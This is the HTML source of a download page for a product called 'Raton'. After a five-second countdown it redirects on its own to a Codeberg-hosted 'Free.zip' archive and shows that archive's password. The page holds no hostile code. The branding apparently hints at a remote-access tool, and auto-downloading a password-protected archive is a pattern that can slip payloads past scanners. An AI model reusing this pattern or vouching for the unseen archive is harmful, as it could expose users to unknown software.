<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Download</title>
<link rel="icon" type="image/png" href="https://raton.lol/img/RATA.png">
<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
<link href="https://fonts.cdnfonts.com/css/kunal" rel="stylesheet">
<link href="https://fonts.cdnfonts.com/css/nishiki-teki" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0d0d0d;
  --surface:#141414;
  --surface2:#1c1c1c;
  --border:rgba(255,255,255,0.07);
  --border2:rgba(255,255,255,0.12);
  --purple:#8b5cf6;
  --purple2:#a78bfa;
  --purple-dim:rgba(139,92,246,0.15);
  --text:#f4f4f8;
  --text2:#a0a0b8;
  --text3:#606078;
  --font-display:'Nishiki-teki',sans-serif;
  --font-logo:'kunal',sans-serif;
  --font-body:'DM Sans',sans-serif;
}
::-webkit-scrollbar{width:6px}
::-webkit-scrollbar-track{background:#0d0d0d}
::-webkit-scrollbar-thumb{background:linear-gradient(180deg,var(--purple),#5b21b6);border-radius:99px;cursor:url('https://raton.lol/img/handpointing.png') 0 0,pointer}
::-webkit-scrollbar-thumb:hover{background:var(--purple2)}
*{scrollbar-width:thin;scrollbar-color:var(--purple) #0d0d0d}
*{cursor:url('https://raton.lol/img/default.png') 0 0,auto}
a,button,[role="button"]{cursor:url('https://raton.lol/img/handpointing.png') 0 0,pointer}
html{scroll-behavior:smooth}
body{
  background:var(--bg);
  color:var(--text);
  font-family:var(--font-body);
  font-size:16px;
  line-height:1.6;
  overflow-x:hidden;
  min-height:100vh;
  display:flex;
  flex-direction:column;
}

.rata-bg{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
.rata-sprite{
  position:absolute;opacity:0;
  will-change:transform,opacity;
  filter:grayscale(20%) brightness(0.65);
  animation:rataFloat linear infinite;
  transform-origin:center;user-select:none;
}
@keyframes rataFloat{
  0%{opacity:0;transform:translateY(0px) rotate(0deg) scale(1)}
  8%{opacity:0.18}
  50%{opacity:0.10;transform:translateY(-28px) rotate(7deg) scale(1.05)}
  92%{opacity:0.18}
  100%{opacity:0;transform:translateY(-55px) rotate(-4deg) scale(0.95)}
}

nav{
  position:sticky;top:0;z-index:100;
  display:flex;align-items:center;justify-content:space-between;
  padding:0 3rem;height:64px;
  background:rgba(13,13,13,0.88);
  backdrop-filter:blur(24px);-webkit-backdrop-filter:blur(24px);
  border-bottom:1px solid var(--border);
}
.nav-logo{
  display:flex;align-items:center;gap:10px;
  font-family:var(--font-logo);font-weight:800;
  font-size:1.5rem;color:var(--text);text-decoration:none;
}
.nav-links{display:flex;align-items:center;gap:2rem;list-style:none}
.nav-links a{
  text-decoration:none;color:var(--text2);
  font-size:0.875rem;font-weight:400;transition:color 0.2s;
}
.nav-links a:hover{color:var(--text)}
.nav-links a.active{color:var(--purple2)}
.nav-mobile-toggle{display:none;background:none;border:none;color:var(--text);padding:6px}

.btn{
  display:inline-flex;align-items:center;gap:8px;
  padding:0.55rem 1.3rem;border-radius:10px;
  font-family:var(--font-body);font-size:0.875rem;font-weight:500;
  text-decoration:none;border:none;transition:all 0.2s;
}
.btn-primary{background:var(--purple);color:#fff}
.btn-primary:hover{background:#7c3aed;transform:translateY(-1px)}
.btn-ghost{background:rgba(255,255,255,0.06);color:var(--text);border:1px solid var(--border2)}
.btn-ghost:hover{background:rgba(255,255,255,0.1)}

.main{
  position:relative;z-index:1;
  flex:1;display:flex;align-items:center;justify-content:center;
  padding:3rem 2rem;
}
.page{
  width:100%;max-width:430px;
  display:flex;flex-direction:column;align-items:center;gap:0.9rem;
  animation:fadeUp .55s cubic-bezier(.22,1,.36,1) both;
}
@keyframes fadeUp{
  from{opacity:0;transform:translateY(20px)}
  to{opacity:1;transform:translateY(0)}
}
.page-logo{
  display:flex;align-items:center;gap:10px;text-decoration:none;
  font-family:var(--font-logo);font-size:1.3rem;font-weight:800;
  color:var(--text);letter-spacing:0.06em;text-transform:uppercase;margin-bottom:0.1rem;
}
.page-sub{text-align:center;font-size:0.82rem;line-height:1.3;color:var(--text2)}
.page-sub #timer{color:var(--purple2);font-weight:700}

.dl-card{
  width:100%;background:var(--surface);
  border:1px solid var(--border2);border-radius:18px;
  padding:1rem;display:flex;flex-direction:column;gap:0.8rem;
  backdrop-filter:blur(12px);
}
.dl-card-top{display:flex;align-items:center;justify-content:space-between;gap:8px}
.pw-block{display:flex;flex-direction:column;gap:0}
.pw-label{font-size:0.66rem;text-transform:uppercase;letter-spacing:0.12em;color:var(--text3)}
.pw-value{font-family:var(--font-display);font-size:1.15rem;font-weight:800;letter-spacing:0.08em;color:var(--purple2)}
.btn-row{display:flex;align-items:center;gap:6px}
.btn-sm{
  display:inline-flex;align-items:center;gap:6px;
  padding:0.45rem 0.9rem;border-radius:9px;text-decoration:none;border:none;
  font-family:var(--font-body);font-size:0.76rem;font-weight:600;transition:.2s ease;
}
.btn-sm svg{flex-shrink:0}
.btn-ghost-sm{background:rgba(255,255,255,0.06);color:var(--text);border:1px solid var(--border2)}
.btn-ghost-sm:hover{background:rgba(255,255,255,0.1)}
.btn-primary-sm{background:var(--purple);color:#fff}
.btn-primary-sm:hover{background:#7c3aed;transform:translateY(-1px)}

@keyframes fall{to{transform:translateY(110vh) rotate(360deg);opacity:0}}

footer{
  position:relative;z-index:1;
  border-top:1px solid var(--border);
  padding:1.5rem 3rem;
  display:flex;align-items:center;justify-content:center;
}
.footer-bottom{font-size:0.75rem;color:var(--text3);text-align:center}

@media(max-width:768px){
  nav{padding:0 1.2rem}
  .nav-links{display:none}
  .nav-mobile-toggle{display:flex}
  nav.open .nav-links{
    display:flex;flex-direction:column;position:fixed;
    top:64px;left:0;right:0;
    background:rgba(13,13,13,0.97);backdrop-filter:blur(20px);
    border-bottom:1px solid var(--border);
    padding:1.5rem 1.5rem 2rem;gap:1.2rem;z-index:99;
  }
  .main{padding:2rem 1.2rem}
  .dl-card-top{flex-direction:column;align-items:stretch}
  .btn-row{width:100%}
  .btn-sm{flex:1;justify-content:center}
  .pw-block{text-align:center}
  footer{padding:1.2rem}
}
</style>
</head>
<body>

<div class="rata-bg" id="rataBg" aria-hidden="true"></div>

<nav id="mainNav">
  <a class="nav-logo" href="https://raton.lol/">
    <img src="https://raton.lol/img/RATA.png" width="28" height="28" alt="Logo" onerror="this.style.display='none'">
    Raton
  </a>
  <ul class="nav-links">
    <li><a href="https://raton.lol/#features">Features</a></li>
    <li><a href="https://raton.lol/#testimonials">Reviews</a></li>
    <li><a href="https://raton.lol/#pricing">Pricing</a></li>
    <li><a href="https://raton.lol/#showcase">Showcase</a></li>
    <li><a href="https://raton.lol/download" class="active">Download</a></li>
  </ul>
  <button class="nav-mobile-toggle" aria-label="Menu" onclick="document.getElementById('mainNav').classList.toggle('open')">
    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
  </button>
</nav>

<main class="main">
  <div class="page">
    <a class="page-logo" href="https://raton.lol/">
      <img src="https://raton.lol/img/RATA.png" width="24" height="24" alt="" onerror="this.style.display='none'">
      Raton
    </a>
    <p class="page-sub">Your download will start automatically in <span id="timer">5</span>s</p>
    <div class="dl-card">
      <div class="dl-card-top">
        <div class="pw-block">
          <span class="pw-label">Password</span>
          <span class="pw-value" id="pwValue">v3.9.5</span>
        </div>
        <div class="btn-row">
          <button class="btn-sm btn-ghost-sm" id="copyBtn" onclick="copyPw()">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="14" height="14">
              <rect x="9" y="9" width="13" height="13" rx="2"/>
              <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
            </svg>
            Copy
          </button>
          <a class="btn-sm btn-primary-sm" id="dlBtn" href="https://codeberg.org/sillycs/notratonupdates/releases/download/v3.9.5/Free.zip">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="14" height="14">
              <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
              <polyline points="7 10 12 15 17 10"/>
              <line x1="12" y1="15" x2="12" y2="3"/>
            </svg>
            Download
          </a>
        </div>
      </div>
    </div>
  </div>
</main>

<footer>
  <p class="footer-bottom">© 2026 SillyCS. All rights reserved</p>
</footer>

<script>
(function(){
  var bg=document.getElementById('rataBg');
  var data=[{x:5,y:8,s:56,d:20,dl:0},{x:18,y:22,s:48,d:24,dl:5},{x:32,y:5,s:64,d:18,dl:9},{x:65,y:3,s:72,d:22,dl:13},{x:78,y:20,s:48,d:30,dl:7},{x:90,y:8,s:60,d:16,dl:11},{x:10,y:55,s:56,d:28,dl:3},{x:72,y:75,s:64,d:25,dl:6}];
  data.forEach(function(r){
    var img=document.createElement('img');
    img.src='https://raton.lol/img/RATA.png';
    img.className='rata-sprite';img.alt='';img.draggable=false;
    img.style.cssText='width:'+r.s+'px;height:'+r.s+'px;left:'+r.x+'%;top:'+r.y+'%;animation-duration:'+r.d+'s;animation-delay:-'+r.dl+'s';
    bg.appendChild(img);
  });
})();

var s=5;
var t=document.getElementById('timer');
var iv=setInterval(function(){
  s--;t.textContent=s;
  if(s<=0){
    clearInterval(iv);confetti();
    window.location.href='https://codeberg.org/sillycs/notratonupdates/releases/download/v3.9.5/Free.zip';
  }
},1000);

function copyPw(){
  var pw=document.getElementById('pwValue').textContent;
  navigator.clipboard.writeText(pw).then(function(){
    var b=document.getElementById('copyBtn');
    b.innerHTML='<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" width="14" height="14"><polyline points="20 6 9 17 4 12"/></svg> Copied';
    setTimeout(function(){
      b.innerHTML='<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="14" height="14"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy';
    },2000);
  });
}

var COLS=['#8b5cf6','#a78bfa','#ffffff','#c4b5fd','#7c3aed','#ddd6fe'];
function confetti(){
  for(var i=0;i<600;i++){
    (function(i){
      setTimeout(function(){
        var el=document.createElement('div');
        var size=Math.random()*9+4;
        el.style.cssText=['position:fixed','left:'+(Math.random()*100)+'vw','top:-10px','width:'+size+'px','height:'+(size*0.6)+'px','background:'+COLS[i%COLS.length],'border-radius:'+(Math.random()>0.5?'50%':'2px'),'animation:fall '+(2+Math.random()*2.5)+'s linear '+(Math.random()*0.8)+'s forwards','transform:rotate('+(Math.random()*360)+'deg)','opacity:'+(0.55+Math.random()*0.45),'pointer-events:none','z-index:9999'].join(';');
        document.body.appendChild(el);
        setTimeout(function(){el.remove();},6000);
      },i*12);
    })(i);
  }
}
document.getElementById('dlBtn').addEventListener('click',confetti);
</script>
</body>
</html>
